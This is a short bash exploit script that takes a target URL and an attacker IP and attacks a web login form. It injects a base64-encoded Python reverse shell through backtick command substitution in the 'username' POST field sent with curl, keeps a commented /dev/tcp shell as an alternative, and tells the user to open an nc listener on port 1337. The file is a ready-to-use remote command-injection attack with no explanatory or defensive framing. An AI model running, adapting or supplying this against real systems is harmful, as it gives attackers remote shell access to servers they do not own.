#!/usr/bin/bash

if [ "$#" -ne 2 ]; then
    echo "usage: $0 <target_url> <attacker_ip>"
    exit 1
fi

target="${1%/}/"
ip=$2
port=1337 

echo -e "\033[1;92m[inf] trying to exploit target : $target \033[0m"
# payload="sh -i >& /dev/tcp/$ip/$port 0>&1"
payload="python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'" 
enc_payload=$(echo -n "$payload" | base64 | tr -d '\n')
echo -e "\033[1;92m[inf] start a listener execute : nc -lvnp $port on another terminal window\033[0m" 
curl -vk $target -d '''username=;`echo '$enc_payload' |base64 -d|bash`'''

